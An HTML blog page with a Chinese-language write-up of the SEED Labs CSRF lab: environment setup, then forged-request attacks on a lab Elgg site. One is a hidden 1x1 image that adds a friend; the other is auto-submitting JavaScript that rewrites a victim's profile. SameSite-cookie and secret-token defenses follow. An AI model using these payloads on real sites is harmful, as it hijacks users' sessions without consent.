@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="跨站请求当用户在访问 A 网站时，A 网站里有一些访问 B 网站的链接，如图片等。在访问 B 网站时，浏览器会把所有和 B 网站有关的 cookies 附加到该请求上。 如果 A 网站是一个恶意网站，里面有一些其他网站的链接，这些链接可以直接修改、获取到某些数据时，就是跨站请求伪造攻击。GET 方法，只需要在 html 中嵌入 &lt;img src&#x3D;&quot;xxx&quot; alt&#x3D;&amp;qu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSRF-Attack-Lab">
+<meta property="og:url" content="https://ceyewan.github.io/p/157470a3.html">
+<meta property="og:site_name" content="Ceyewan&#39;s Blog">
+<meta property="og:description" content="跨站请求当用户在访问 A 网站时，A 网站里有一些访问 B 网站的链接，如图片等。在访问 B 网站时，浏览器会把所有和 B 网站有关的 cookies 附加到该请求上。 如果 A 网站是一个恶意网站，里面有一些其他网站的链接，这些链接可以直接修改、获取到某些数据时，就是跨站请求伪造攻击。GET 方法，只需要在 html 中嵌入 &lt;img src&#x3D;&quot;xxx&quot; alt&#x3D;&amp;qu">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20230409224852983.png">
+<meta property="article:published_time" content="2023-04-09T15:34:43.000Z">
+<meta property="article:modified_time" content="2024-03-28T16:16:52.803Z">
+<meta property="article:author" content="ceyewan">
+<meta property="article:tag" content="CSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20230409224852983.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/icons.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/icon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/icon-apple-touch.png">
+        
+      
+    
+    <!-- title -->
+    <title>CSRF-Attack-Lab</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/p/e19655e2.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/p/5e644521.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/157470a3.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/157470a3.html&text=CSRF-Attack-Lab"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/157470a3.html&title=CSRF-Attack-Lab"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/157470a3.html&is_video=false&description=CSRF-Attack-Lab"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CSRF-Attack-Lab&body=Check out this article: https://ceyewan.github.io/p/157470a3.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/157470a3.html&title=CSRF-Attack-Lab"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/157470a3.html&title=CSRF-Attack-Lab"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/157470a3.html&title=CSRF-Attack-Lab"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/157470a3.html&title=CSRF-Attack-Lab"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/157470a3.html&name=CSRF-Attack-Lab&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/157470a3.html&t=CSRF-Attack-Lab"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82"><span class="toc-number">1.</span> <span class="toc-text">跨站请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-Attack-using-GET-Requset"><span class="toc-number">3.</span> <span class="toc-text">CSRF Attack using GET Requset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-Attack-using-POST-Requset"><span class="toc-number">4.</span> <span class="toc-text">CSRF Attack using POST Requset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A7%98%E5%AF%86%E4%BB%A4%E7%89%8C"><span class="toc-number">5.1.</span> <span class="toc-text">秘密令牌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SameSite-Cookie"><span class="toc-number">5.2.</span> <span class="toc-text">SameSite Cookie</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CSRF-Attack-Lab
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ceyewan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-04-09T15:34:43.000Z" class="dt-published" itemprop="datePublished">2023-04-09</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/SeedLabs-WebSecurity/">SeedLabs/WebSecurity</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CSRF/" rel="tag">CSRF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="跨站请求"><a href="#跨站请求" class="headerlink" title="跨站请求"></a>跨站请求</h2><p>当用户在访问 A 网站时，A 网站里有一些访问 B 网站的链接，如图片等。在访问 B 网站时，浏览器会把所有和 B 网站有关的 cookies 附加到该请求上。</p>
+<p>如果 A 网站是一个恶意网站，里面有一些其他网站的链接，这些链接可以直接修改、获取到某些数据时，就是跨站请求伪造攻击。GET 方法，只需要在 html 中嵌入 <code>&lt;img src=&quot;xxx&quot; alt=&quot;iamge&quot; width=&quot;1&quot; height=&quot;1&quot; /&gt;</code> 即可；对于 POST 请求，需要使用 JS 来构造。</p>
+<p>防御方法：</p>
+<ul>
+<li>同站 cookie，给 cookie 添加了一个 SameSite 属性，用于告诉浏览器一个 cookie 是否可以跨站请求使用。其中 SameSite&#x3D;Strict 时，cookie 在跨站请求时不会发送；SameSite&#x3D;Lax 时，只有顶级导航的跨站请求才会一起发送。</li>
+<li>秘密令牌。在每个网页内嵌入一个随机的机密值&#x2F;把一个机密值放在 cookie 中。使用同源策略，不同源的页面不能读取其他源的 cookie 内容。</li>
+</ul>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>我使用的是云服务器，不过，之前都是使用的 SSH 连接。现在，网络安全了之后，需要使用到抓包工具之类的，搞端口转发代理，终归还是不太方便。重新配下吧，搞个 VNC 远程桌面。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -o src-cloud.zip https://seed.nyc3.cdn.digitaloceanspaces.com/src-cloud.zip</span><br><span class="line">unzip src-cloud.zip</span><br><span class="line">./install.sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在安装中，需要选择 Wireshark 为 No，xfce4 为 LightDM</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">对于一些需要从 github 安装的软件，受限于国内网络环境，可能需要手动安装</span></span><br><span class="line">sudo su seed # 切换到 seed 用户</span><br><span class="line">vncserver -localhost no -geometry 1920x1080 # 启动一个 vnc 服务</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在本地安装一个 VNC viewer，输入 ip:5901 即可访问。需要服务器开发该端口</span></span><br><span class="line">vncserver -list    # 查看 VNC 会话</span><br><span class="line">vncserver -kill :1 # 结束 VNC 会话，如果开了多个会话，端口会变化</span><br></pre></td></tr></table></figure>
+
+<p>从实验页面下载源文件，然后执行 <code>dcbuild</code> 和 <code>dcup</code> 启动环境，并且，在 <code>/etc/hosts</code> 中配置如下的域名映射。确实离谱，ip 相同，为啥访问结果不同呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.9.0.5        www.seed-server.com</span><br><span class="line">10.9.0.5        www.example32.com</span><br><span class="line">10.9.0.105      www.attacker32.com</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>10.9.0.5</code> 上跑着我们的 elgg 网络程序，在 <code>10.9.0.105</code> 上跑着我们的攻击者网页。攻击者网页的 <code>html</code> 代码需要我们自行更改，保存在 <code>Labsetup/attacker</code> 中。</p>
+<h2 id="CSRF-Attack-using-GET-Requset"><a href="#CSRF-Attack-using-GET-Requset" class="headerlink" title="CSRF Attack using GET Requset"></a>CSRF Attack using GET Requset</h2><p>Samy 想要添加 Alice 好友，但是 Alice 不同意。于是 Samy 需要诱导 Alice 访问恶意网站，恶意网站会调用 Alice 的 <code>cookie</code>，秘密的在后台为 Alice 完成添加 Samy 为好友的请求，这样，女神就主动添加 Samy 为好友了。</p>
+<p>远程连接上服务器，为 firefox 浏览器安装 HTTP Header Live 插件，随便登录一个用户，用户名密码在实验文档中有，添加 Samy 为好友，可以看到 URL 如下，后面的密码令牌我们暂不考虑，重要的就是拿到这个 <code>friend=59</code>，这样，谁访问了 <code>http://www.seed-server.com/action/friends/add?friend=59</code> 谁就添加了 Samy 为好友。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.seed-server.com/action/friends/add?friend=59xxxx</span><br></pre></td></tr></table></figure>
+
+<p>因此，我们修改恶意网站为的 <code>addfriend.html</code> 如下，这样浏览器以为是请求 <code>img</code>，实则完成了对该特定链接的访问，也就是说，Alice 在不知不觉中添加了 Samy 为好友。不过，这种攻击方法在现在的 firefox 浏览器中已经无法使用了（用提供的虚拟机的话是可以的）</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>This page forges an HTTP GET request<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.seed-server.com/action/friends/add?friend=59&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;image&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="CSRF-Attack-using-POST-Requset"><a href="#CSRF-Attack-using-POST-Requset" class="headerlink" title="CSRF Attack using POST Requset"></a>CSRF Attack using POST Requset</h2><p>添加了 Alice 为好友后，Samy 还不满足，他想要将 Alice 的个人简介修改为 <code>Samy is my Hero</code>，修改个人信息是一个 POST 请求，同样，Samy 可以先修改自己的简介，使用插件拿到 HTTP 请求如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://www.seed-server.com/action/profile/edit # URL</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">除了不需要的东西，重要的是 name description accesslevel guid</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">和上面拿到 Samy 的 ID 一样，我们可以拿到 Alice 的 guid=56</span></span><br><span class="line">__elgg_token=nOuayPhDLt-yoisTMOmJZg&amp;__elgg_ts=1681041396&amp;name=Samy&amp;description=&lt;p&gt;hhhhhhhh&lt;/p&gt; &amp;accesslevel[description]=2&amp;briefdescription=&amp;accesslevel[briefdescription]=2&amp;location=&amp;accesslevel[location]=2&amp;interests=&amp;accesslevel[interests]=2&amp;skills=&amp;accesslevel[skills]=2&amp;contactemail=&amp;accesslevel[contactemail]=2&amp;phone=&amp;accesslevel[phone]=2&amp;mobile=&amp;accesslevel[mobile]=2&amp;website=&amp;accesslevel[website]=2&amp;twitter=&amp;accesslevel[twitter]=2&amp;guid=59</span><br></pre></td></tr></table></figure>
+
+<p>有了这些东西，我们可以构造 HTML 了，这次我们要在 HTML 中嵌入 js 代码，js 代码悄悄地执行如上的请求。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">forge_post</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> fields;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// The following are form entries need to be filled out by attackers.</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// The entries are made hidden, so the victim won&#x27;t be able to see them.</span></span></span><br><span class="line"><span class="language-javascript">        fields += <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;name&#x27; value=&#x27;Alice&#x27;&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        fields += <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;briefdescription&#x27; value=&#x27;Samy is my Hero&#x27;&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        fields += <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;accesslevel[briefdescription]&#x27; value=&#x27;2&#x27;&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        fields += <span class="string">&quot;&lt;input type=&#x27;hidden&#x27; name=&#x27;guid&#x27; value=&#x27;56&#x27;&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// Create a &lt;form&gt; element.</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;form&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// Construct the form</span></span></span><br><span class="line"><span class="language-javascript">        p.<span class="property">action</span> = <span class="string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        p.<span class="property">innerHTML</span> = fields;</span></span><br><span class="line"><span class="language-javascript">        p.<span class="property">method</span> = <span class="string">&quot;post&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// Append the form to the current page.</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(p);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// Submit the form</span></span></span><br><span class="line"><span class="language-javascript">        p.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// Invoke forge_post() after the page is loaded.</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="title function_">forge_post</span>(); &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当我们重启容器，点击了该按钮，就能得到结果（GET 请求不行）：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20230409224852983.png" alt="image-20230409224852983"></p>
+<p>如果我们不知道谁会访问我们的攻击网站，那么咋整呢？ 还能攻击吗？应该是只能执行加好友攻击了，修改个性签名这种就不行了。</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="秘密令牌"><a href="#秘密令牌" class="headerlink" title="秘密令牌"></a>秘密令牌</h3><p>在 elgg 中，使用了 <code>__elgg_ts</code> 和 <code>__elgg_token</code> 这两个秘密令牌，攻击者拿不到这两个密码令牌，就无法实施攻击。在上面，我们是讲 elgg 对秘密令牌的验证注释掉了，取消注释之后，攻击无法实施。</p>
+<h3 id="SameSite-Cookie"><a href="#SameSite-Cookie" class="headerlink" title="SameSite Cookie"></a>SameSite Cookie</h3><p>在我们访问 <code>http://www.example32.com/</code> 时，会在浏览器本地添加 <code>cookie-normal、cookie-lax、cookie-strict</code> 这三种 <code>cookie</code>。</p>
+<p>对于 <code>Experiment A</code>，三种请求都可以使用全部的 <code>cookie</code>。因为 <code>Experiment A</code> 的地址为 <code>www.example32.com/testing.html</code> 属于同站请求。</p>
+<p>对于 <code>Experiment B</code>，GET 请求和 GET 类型的表单请求，都可以使用 <code>normal-cookie</code> 和 <code>lax-cookie</code>；而 POST 类型的请求，只能使用 <code>normal-cookie</code>。因为 <code>Experiment B</code> 的地址为 <code>http://www.example32.com/showcookies.php</code> 为跨站请求。</p>
+<p><code>Lax-Cookie</code> 仅允许 <code>GET</code> 请求中的 <code>Cookie</code> 在跨站请求时被发送，而不允许 <code>POST</code> 请求中的 <code>Cookie</code> 发送。这是因为 <code>GET</code> 请求通常用于获取资源，例如显示网页或图像。这些请求不会对服务器状态进行更改，并且不会引起安全问题。添加这样的 <code>Cookie</code> 有利于用户的体验。</p>
+<p>而 <code>POST</code> 请求通常用于提交表单或执行其他对服务器状态进行更改的操作。这些请求可能会对用户数据或服务器状态造成安全威胁。因此，禁止 <code>POST</code> 请求中的 <code>Cookie</code> 在跨站请求时被发送，可以降低 <code>CSRF</code> 攻击的风险。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82"><span class="toc-number">1.</span> <span class="toc-text">跨站请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-Attack-using-GET-Requset"><span class="toc-number">3.</span> <span class="toc-text">CSRF Attack using GET Requset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-Attack-using-POST-Requset"><span class="toc-number">4.</span> <span class="toc-text">CSRF Attack using POST Requset</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A7%98%E5%AF%86%E4%BB%A4%E7%89%8C"><span class="toc-number">5.1.</span> <span class="toc-text">秘密令牌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SameSite-Cookie"><span class="toc-number">5.2.</span> <span class="toc-text">SameSite Cookie</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/157470a3.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/157470a3.html&text=CSRF-Attack-Lab"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/157470a3.html&title=CSRF-Attack-Lab"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/157470a3.html&is_video=false&description=CSRF-Attack-Lab"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CSRF-Attack-Lab&body=Check out this article: https://ceyewan.github.io/p/157470a3.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/157470a3.html&title=CSRF-Attack-Lab"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/157470a3.html&title=CSRF-Attack-Lab"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/157470a3.html&title=CSRF-Attack-Lab"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/157470a3.html&title=CSRF-Attack-Lab"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/157470a3.html&name=CSRF-Attack-Lab&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/157470a3.html&t=CSRF-Attack-Lab"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+      
+        
+          2016-2024
+  </div>
+  <div class="footer-left">
+    ceyewan
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
